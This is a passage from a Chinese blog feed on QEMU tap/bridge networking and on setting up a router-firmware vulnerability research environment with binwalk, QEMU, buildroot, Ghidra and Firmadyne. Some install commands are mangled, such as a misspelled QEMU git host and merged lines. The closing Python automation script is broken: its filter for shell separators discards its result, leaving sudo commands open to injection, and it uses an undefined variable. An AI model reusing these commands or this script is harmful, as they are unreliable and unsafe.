<p>可以更具体指定网卡接口名称(就是刚才创建的 tap0，相当于把虚拟机接入网桥)。script 和 downscript 两个选项的作用是告诉 QEMU 在启动系统的时候是否调用脚本自动配置网络环境，如果这两个选项为空，那么 QEMU 启动和退出时会自动选择第一个不存在的 tap 接口(通常是 tap0)为参数，调用脚本 /etc/qemu-ifup 和 /etc/qemu-ifdown。</p>
</li>
<li><p>在ubuntu16.04上演示：</p>
<p>在 /etc/network/interfaces 文件中配置网桥br0，在/etc/qemu-ifup中配置tap0。</p>
<p>在qemu启动虚拟机之前，<code>ifconfig -a</code>查看网卡信息，此时已经有网桥br0了。</p>
<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/ifconfig.png" alt=""></p>
<p>启动qemu时，自动调用/etc/qemu-ifup，启用tap0网卡并接入网桥中。这时<code>ifconfig</code>可以看见多了tap0网卡。</p>
<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/%E5%90%AF%E5%8A%A8qemu.png" alt=""></p>
<p>使用root/root登入qemu虚拟机<code>ifconfig</code>查看网卡信息。</p>
<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/qemu_ifconfig.png" alt=""></p>
<p>发现eth1网卡的ip地址为192.168.0.101，<code>cat /etc/network/interfaces</code>发现eth1是通过dhcp服务器分配ip地址的。</p>
<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/qemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE.png" alt=""></p>
<p><code>ping www.baidu.com</code>能够ping通说明配置成功了。</p>
<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/ping%E7%99%BE%E5%BA%A6.png" alt=""></p>
<p><code>brctl show br0</code>查看br0网桥列表，<code>brctl showstp br0</code>查看br0网桥的各接口信息。可以看到网桥连着两块网卡tap0和ens33。</p>
<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/%E7%BD%91%E6%A1%A5%E5%90%84%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF.png" alt=""></p>
</li>
</ol>
<h1 id="Firmadyne中配置网卡部分"><a href="#Firmadyne中配置网卡部分" class="headerlink" title="Firmadyne中配置网卡部分"></a>Firmadyne中配置网卡部分</h1><p>文件：/firmadyne/scratch/x/run.sh(x是对应固件的编号，如果下载了schema并导入了postgresql数据库的话，则是按照数据库中的编号)</p>
<pre class=" language-sh"><code class="language-sh">···
#配置网卡过程
TAPDEV_0=tap${IID}_0
HOSTNETDEV_0=${TAPDEV_0}
echo "Creating TAP device ${TAPDEV_0}..."
sudo tunctl -t ${TAPDEV_0} -u ${USER} #配置网卡

echo "Initializing VLAN..."
HOSTNETDEV_0=${TAPDEV_0}.1 
sudo ip link add link ${TAPDEV_0} name ${HOSTNETDEV_0} type vlan id 1 #相当于tap0是网桥，而HOSTNETDEV作为网桥的一端配置好ip接口，并且添加vlan网口，可以用ip link确认VLAN的创建
sudo ip link set ${TAPDEV_0} up #启动tap0

echo "Bringing up TAP device..."
sudo ip link set ${HOSTNETDEV_0} up #将网桥一端的HOSTNETDEV启动
sudo ip addr add 192.168.0.2/24 dev ${HOSTNETDEV_0} #配置IP为192.168.0.2

echo "Adding route to 192.168.0.1..."
sudo ip route add 192.168.0.1 via 192.168.0.1 dev ${HOSTNETDEV_0} #添加到192.168.0.1的路由给HOSTDEVNAME
···

# 利用qemu系统模式进行仿真
 ${QEMU} -m 256 -M ${QEMU_MACHINE} -kernel ${KERNEL} \
    -drive if=ide,format=raw,file=${IMAGE} -append "root=${QEMU_ROOTFS} console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0" \
    -nographic \
    -netdev tap,id=net0,ifname=${TAPDEV_0},script=no -device e1000,netdev=net0 -netdev socket,id=net1,listen=:2001 -device e1000,netdev=net1 -netdev socket,id=net2,listen=:2002 -device e1000,netdev=net2 -netdev socket,id=net3,listen=:2003 -device e1000,netdev=net3 | tee ${WORK_DIR}/qemu.final.serial.log
    #-netdev tap,id=net0,ifname=${TAPDEV_0},script=no 指示网络后端为tap并且id=net0，对应的网卡设备为ifname指定的网卡，id是用来指定对应的后端，达到一对一的目的。</code></pre>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/41258581" target="_blank" rel="noopener">QEMU新的-nic选项</a></p>
<p><a href="https://zh.wikipedia.org/wiki/TUN与TAP" target="_blank" rel="noopener">TUN与TAP</a></p>
<p><a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>qemu</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>路由器漏洞挖掘环境搭建</title>
    <url>/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从2019年5月开始决定把物联网漏洞挖掘作为自己的课题开始，到现在也断断续续调试分析过一些漏洞，感觉一路心酸历程啊！确实踩了很多坑，恰逢最近重新搭建环境，值此良机，整理下搭建过程。</p>
<p>我使用的是ubuntu16.04 LTS虚拟机。</p>
<h1 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h1><p>因为利用apt-get安装binwalk会缺少很多依赖项所以还是建议根据 <a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md" target="_blank" rel="noopener">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a> </p>
<pre class=" language-shell"><code class="language-shell">git clone https://github.com/ReFirmLabs/binwalk.git
cd binwalk
# 对于Debian/Ubuntu的用户而言，很多依赖项都可以通过deps.sh安装
sudo ./deps.sh
sudo python ./setup.py install</code></pre>
<p> 下载源代码自己编译 </p>
<pre class=" language-shell"><code class="language-shell">sudo apt-get install git build-essential autoconfsudo 
git clone https://github.com/devttys0/binwalk.git
sudo apt-get install libqt4-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip
sudo pip install pyqtgraph
sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
git clone https://github.com/devttys0/sasquatchcd sasquatch && sudo make && sudo make install
sudo python setup.py install</code></pre>
<h1 id="安装sasquatch"><a href="#安装sasquatch" class="headerlink" title="安装sasquatch"></a>安装sasquatch</h1><p>一般现在binwalk完全安装时会自动带上这个sasquatch，输入这三条命令就可以了 </p>
<pre class=" language-text"><code class="language-text">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
sudo git clone https://github.com/devttys0/sasquatch
cd sasquatch && sudo make && sudo make install</code></pre>
<h1 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h1><h2 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h2><p>下面安装qemu的步骤参照知世师傅的<a href="[https://nightrainy.github.io/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://nightrainy.github.io/2019/11/04/路由器破解初探之环境搭建/)">博客内容</a></p>
<ol>
<li>直接安装qemu，直接使用系统提供的版本，ubuntu16.04一般是qemu2.5</li>
</ol>
<pre class=" language-shell"><code class="language-shell">sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo apt-get install qemu 
sudo apt-get install qemu-user-static
sudo apt-get install qemu-system</code></pre>
<ol start="2">
<li><p>自己编译</p>
<ol>
<li><p>git </p>
<pre class=" language-sh"><code class="language-sh">git clone git://git.qqmu-project.org/qemu.git/qemu.git
git submodule update --init pixman
git submodule update --init dtc
sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo ./configure --static && sudo make -j8 && sudo make install
注: 使用configure 使用static参数的时候,依赖可能会根据不同环境导致依赖缺失,可以根据报错来解决依赖问题
</code></pre>
</li>
<li><p>wget</p>
<p> 可根据需求不同来选择不同的版本 </p>
<pre class=" language-sh"><code class="language-sh">sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo arm-softmmu
wget https://download.qemu.org/qemu-4.1.0.tar.xz
tar xvJf qemu-4.1.0.tar.xz
cd qemu-4.1.0
sudo ./configure --target-list=arm-softmmu,mips-softmmu,mipsel-softmmu --audio-drv-list=alsa,pa
sudo make -j8
sudo make install</code></pre>
</li>
<li><p>这里贴出官方的安装教程</p>
<ol>
<li><p>To download and build QEMU 4.1.0:</p>
<pre class=" language-shell"><code class="language-shell">wget https://download.qemu.org/qemu-4.1.0.tar.xz
tar xvJf qemu-4.1.0.tar.xz
cd qemu-4.1.0
./configure
make</code></pre>
</li>
<li><p>To download and build QEMU from git:</p>
<pre class=" language-shell"><code class="language-shell">git clone https://git.qemu.org/git/qemu.git
cd qemu
git submodule init
git submodule update --recursive
./configure
make</code></pre>
</li>
<li><p>Debian/Ubuntu:</p>
<pre class=" language-sh"><code class="language-sh">apt-get install qemu</code></pre>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="qemu网络配置"><a href="#qemu网络配置" class="headerlink" title="qemu网络配置"></a>qemu网络配置</h2><pre class=" language-shell"><code class="language-shell">sudo apt-get install bridge-utils #虚拟网桥工具
sudo apt-get install uml-utilities # UML（User-mode linux）工具</code></pre>
<p><code>sudo vi /etc/network/interfaces</code></p>
<p>写入下面的内容：</p>
<pre class=" language-shell"><code class="language-shell"># interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback
auto ens33
iface ens33 inet manual
up ifconfig ens33 0.0.0.0 up
auto br0
iface br0 inet dhcp
  bridge_ports ens33
  bridge_maxwait 0</code></pre>
<p>改完之后要重启网卡才能生效：</p>
<p><code>sudo /etc/init.d/networking  restart</code></p>
<p> 配置 qemu 虚拟机的网卡信息： </p>
<p><code>sudo vi /etc/qemu-ifup</code></p>
<p> 将原来的内容注释，换成下面的内容： </p>
<pre class=" language-shell"><code class="language-shell">#! /bin/sh
echo "Executing /etc/qemu-ifup"
echo "bridge networking"
echo "Bringing up $1 for bridge mode"
sudo /sbin/ifconfig $1 0.0.0.0 promisc up
echo "Adding $1 to br0"
sudo /sbin/brctl addif br0 $1
sleep 3</code></pre>
<h2 id="qemu-mips对应包下载"><a href="#qemu-mips对应包下载" class="headerlink" title="qemu-mips对应包下载"></a>qemu-mips对应包下载</h2><p>从 <a href="https://people.debian.org/~aurel32/qemu/mips/下载对应的debian" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/mips/下载对应的debian</a> mips qemu镜像  </p>
<p><img src="mips_qemu.png" alt=""></p>
<p>选择debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta.   </p>
<p>使用qemu系统模式加载之前下载的内核：qemu-system-mips对于mips的镜像。</p>
<pre class=" language-shell"><code class="language-shell">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap</code></pre>
<p>可以看到一个qemu虚拟机，用root/root登录进去：   </p>
<p><img src="qemu_mips%E8%99%9A%E6%8B%9F%E6%9C%BA.png" alt=""></p>
<p><code>nano /etc/network/interfaces</code>将网卡eth0改为eth1：  </p>
<p><code>/etc/init.d/networking restart</code>看是否配置成功，不然可以重启qemu试试是否自动配置好了eth1的网卡信息。 </p>
<p>进去虚拟机之后，如果发现只有网卡的其他信息、没有 IP 地址，<strong>可以手动配置一下 eth1 网卡的 IP</strong>：</p>
<pre class=" language-sh"><code class="language-sh">ifconfig eth1 192.168.91.130/24 #跟宿主机在同一个网段内</code></pre>
<p>之后ping一下外面的主机看看是否联通。宿主机也可以通过ssh <a href="mailto:root@192.168.91.130">root@192.168.91.130</a>远程登陆进去。</p>
<p>以后的文章可能会细讲，qemu的网络配置和通信。</p>
<h1 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h1><ol>
<li><p>下载buildroot安装包（我这里选了一个2019.02版本）</p>
<pre class=" language-shell"><code class="language-shell">wget http://buildroot.net/downloads/buildroot-2019.02.tar.gz
或者直接从http://buildroot.net/downloads/下载</code></pre>
</li>
<li><p>解压安装包</p>
<pre class=" language-shell"><code class="language-shell">tar -zxvf buildroot-2019.02.tar.gz</code></pre>
</li>
<li><p>进入安装包，配置   </p>
<pre class=" language-shell"><code class="language-shell">cd buildroot-2019.02 && make clean && make menuconfig</code></pre>
</li>
<li><p>进入配置界面</p>
<p><img src="%E9%85%8D%E7%BD%AE%E7%95%8C%E9%9D%A2.png" alt=""></p>
<p>首先根据想要调试的目标架构进行配置Target options，我因为要调试mips小端架构，所以选择如下： </p>
<p><img src="target_options.png" alt="">  </p>
<p>Build options选择默认就好，进入Toolchain进入配置</p>
<p>C library选择uClibc-ng，因为二进制文件是使用此库编译的，所以大多数设备都是用此C库</p>
<p><img src="c_library.png" alt=""></p>
<p>其中的kernel Headers根据查看ubantu操作系统内核进行选择 </p>
<p><code>uname -a</code></p>
<p><img src="uname_a.png" alt=""></p>
<p>选择Manually specified然后找到4.15.x并选择</p>
<p><img src="kernel_head.png" alt=""></p>
<p>gcc 版本选择</p>
<p><code>gcc -v</code></p>
<p><img src="gcc-.png" alt=""></p>
<p>选择gcc 5.x   </p>
<p><img src="gcc-%E9%80%89%E6%8B%A9.png" alt=""></p>
<p>最后启用“为主机启用交叉编译的gdb”按Y选中,括号内会有*号。   </p>
<p><img src="gdb%E9%80%89%E6%8B%A9.png" alt=""></p>
<p>最后<code>sudo make -j8</code> </p>
</li>
<li><p>配置环境变量</p>
<p>在/etc/profile文件中加入</p>
<p><code>export PATH=$PATH:/home/yourname/buildroot-2019.02.2/output/host/bin</code></p>
<p>最后<code>source /etc/profile</code></p>
</li>
<li><p>检验是否能编译生成mipsel文件</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"demo\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>利用<code>mipsel-linux-gcc demo.c -static -o demo</code>得到是小端文件，并且能直接运行。</p>
<pre class=" language-shell"><code class="language-shell"> ~/Desktop/IoT :  mipsel-linux-gcc demo.c -static -o demo
 ~/Desktop/IoT :  file demo
demo: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</code></pre>
<p>如果没有加<code>-static</code>将需要动态链接库</p>
<p><img src="%E9%9C%80%E8%A6%81%E9%93%BE%E6%8E%A5%E5%BA%93.png" alt=""></p>
<p>这时我们只需要找到该库，使用<code>qemu-mipsel -L /Your_Path/buildroot/output/target/ hello</code>即可运行。 </p>
</li>
</ol>
<h1 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h1><p> Ghidra是由美国国家安全局（NSA）研究部门开发的软件逆向工程（SRE）套件，用于支持网络安全任务。  该反汇编工具类似于我们常用的IDA，不过其基于JAVA开发，是一款适用于Windows、Mac和Linux的跨平台反汇编工具，用户还可以使用Java或Python开发自己的Ghidra插件或者脚本。 </p>
<h2 id="安装条件"><a href="#安装条件" class="headerlink" title="安装条件"></a>安装条件</h2><p>硬件条件:4GB内存;1GB硬盘空间</p>
<p>软件条件:Java 11+</p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>百度盘下载地址：<a href="https://pan.baidu.com/s/1zHWilk5NiTuzDItQhI8nnQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1zHWilk5NiTuzDItQhI8nnQ</a> （提取码 ：8upz） </p>
<p>github地址： <a href="https://github.com/NationalSecurityAgency/Ghidra" target="_blank" rel="noopener">https://github.com/NationalSecurityAgency/Ghidra</a> </p>
<p>项目主页： <a href="https://Ghidra-sre.org" target="_blank" rel="noopener">https://Ghidra-sre.org</a> 可以直接从上面下载最新的ghidra</p>
<p><a href="https://www.secrss.com/articles/8829" target="_blank" rel="noopener">NSA开源逆向工具Ghidra入门使用教程</a></p>
<p>在Ubuntu16.04中同样可以建立一个软链接进行快捷键启动。</p>
<pre class=" language-sh"><code class="language-sh">ln -s /home/yourname/project/ghidra_9.1.2_PUBLIC_20200212/ghidra_9.1.2_PUBLIC/ghidraRun /usr/bin/ghidra</code></pre>
<h2 id="Ghidra插件使用"><a href="#Ghidra插件使用" class="headerlink" title="Ghidra插件使用"></a>Ghidra插件使用</h2><p>可以学习Freebuf上平安银河实验室提供的免费<a href="https://live.freebuf.com/detail/719e1138a016a5bffbfe0daeb4533b4f" target="_blank" rel="noopener">公开课</a>，然后其中的插件可以参照平安银河实验室写的Ghidra_scripts<a href="https://github.com/PAGalaxyLab/ghidra_scripts" target="_blank" rel="noopener">https://github.com/PAGalaxyLab/ghidra_scripts</a> </p>
<h1 id="Firmadyne"><a href="#Firmadyne" class="headerlink" title="Firmadyne"></a>Firmadyne</h1><p>Firmadyne是一个基于qemu的Linux嵌入式系统自动仿真工具。利用它可以主要可以模拟路由器固件的运行。它拥有自己自己预编译好的mips架构Linux内核。</p>
<p>github传送门： <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a> 里面有详细的安装和使用说明。</p>
<p>也可以参考这篇帖子进行安装使用： <a href="https://chuansongme.com/n/1009525252762" target="_blank" rel="noopener">https://chuansongme.com/n/1009525252762</a> </p>
<p>到此环境差不多安装完了。</p>
<p>安装完成之后，可以自己编写脚本来批量化手工的操作，这里修改了知世师傅的一个<a href="https://github.com/nightRainy/Auxiliary_tools/blob/master/iot/fastrun.py" target="_blank" rel="noopener">脚本</a>。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> pexpect
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> glob

passd<span class="token operator">=</span><span class="token string">"firmadyne"</span>

<span class="token keyword">def</span> <span class="token function">myinit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"[+]Usage:sudo ./fastrun.py xxx.bin"</span><span class="token punctuation">)</span> 
    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"[+]Please input the right file name"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">fake_extractor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step1:extracting now ..."</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'&amp;&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">)</span>
    extractor_cmd<span class="token operator">=</span><span class="token string">"sudo ./sources/extractor/extractor.py -b dlink -sql 127.0.0.1 -np -nk "</span> <span class="token operator">+</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token string">" images"</span>
    <span class="token comment" spellcheck="true">#extractor_cmd="sudo ./sources/extractor/extractor.py -b linksys -sql 127.0.0.1 -np -nk " +sys.argv[1] +" images"</span>
    <span class="token comment" spellcheck="true">#extractor_cmd="sudo ./sources/extractor/extractor.py -b netgear -sql 127.0.0.1 -np -nk " +sys.argv[1] +" images"</span>
    child <span class="token operator">=</span> pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>extractor_cmd<span class="token punctuation">,</span> timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    child<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token string">"Database Image ID: "</span><span class="token punctuation">)</span>
    image_id <span class="token operator">=</span> child<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    child<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
    <span class="token keyword">return</span> image_id

<span class="token keyword">def</span> <span class="token function">get_arch</span><span class="token punctuation">(</span>image_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step2:getting arch now..."</span><span class="token punctuation">)</span>
    get<span class="token operator">=</span><span class="token string">"sudo ./scripts/getArch.sh ./images/"</span> <span class="token operator">+</span> image_id <span class="token operator">+</span> <span class="token string">".tar.gz "</span>
    arch<span class="token operator">=</span> pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>get<span class="token punctuation">,</span>timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    index<span class="token operator">=</span>arch<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"firmadyne:"</span><span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]sendline password"</span><span class="token punctuation">)</span>
        arch<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>passd<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        arch<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">'[+]get arch failed!'</span><span class="token punctuation">)</span>
    arch<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Done!"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">make_images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step3:making image now"</span><span class="token punctuation">)</span>
    make<span class="token operator">=</span><span class="token string">'sudo ./scripts/makeImage.sh '</span> <span class="token operator">+</span> image_id
    images<span class="token operator">=</span>pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>make<span class="token punctuation">,</span>timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    index<span class="token operator">=</span>images<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"firmadyne:"</span><span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>index<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]sendline password"</span><span class="token punctuation">)</span>
        images<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>passd<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        images<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"[+]make images failed!"</span><span class="token punctuation">)</span>
    images<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Done!"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">set_net</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step4:Setting inferNetwork now"</span><span class="token punctuation">)</span>
    myset<span class="token operator">=</span><span class="token string">"sudo ./scripts/inferNetwork.sh "</span> <span class="token operator">+</span> image_id
    net<span class="token operator">=</span>pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>myset<span class="token punctuation">,</span>timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    index<span class="token operator">=</span>net<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"firmadyne"</span><span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">,</span>pexpect<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>index<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]sendline password"</span><span class="token punctuation">)</span>
        net<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>passd<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        net<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">"[+]make images failed!"</span><span class="token punctuation">)</span>
    net<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Done!"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Step5:Running now!"</span><span class="token punctuation">)</span>
    myrun<span class="token operator">=</span><span class="token string">"sudo ./scratch/"</span> <span class="token operator">+</span> image_id <span class="token operator">+</span> <span class="token string">"/run.sh"</span>
    index<span class="token operator">=</span>pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>myrun<span class="token punctuation">,</span>timeout<span class="token operator">=</span>None<span class="token punctuation">)</span>
    index<span class="token punctuation">.</span>interact<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Done!"</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    myinit<span class="token punctuation">(</span><span class="token punctuation">)</span>
